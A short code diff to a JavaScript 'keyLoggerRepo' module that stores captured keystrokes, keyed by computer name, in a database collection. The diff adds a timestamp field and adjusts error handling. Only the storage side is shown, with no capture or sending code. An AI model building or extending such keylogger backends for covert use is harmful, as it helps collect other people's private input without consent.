@@ -12,10 +12,11 @@ const keyLoggerRepo = {
       }
     });
   },
-  saveStrokes: (name, strokes) => {
+  saveStrokes: (name, strokes, time) => {
     const newStrokes = {
       computerName: name,
-      keystrokes: strokes
+      keystrokes: strokes,
+      timestamp: time
     };
     keyLoggerDB.collection("Keystrokes"
     ).insertOne(newStrokes, (error, res) => {
@@ -25,8 +26,6 @@ const keyLoggerRepo = {
       if(!res){
         throw new Error("No response from database")
       }
-    }).catch(e => {
-      throw new Error("Problem saving keystrokes to the database.")
     });
   }
   ,
@@ -39,7 +38,7 @@ const keyLoggerRepo = {
         return items
       })
       .catch(e => {
-        console.log(e);
+        throw new Error("Error retrieving keystrokes from the DB");
       });
   }
   ,
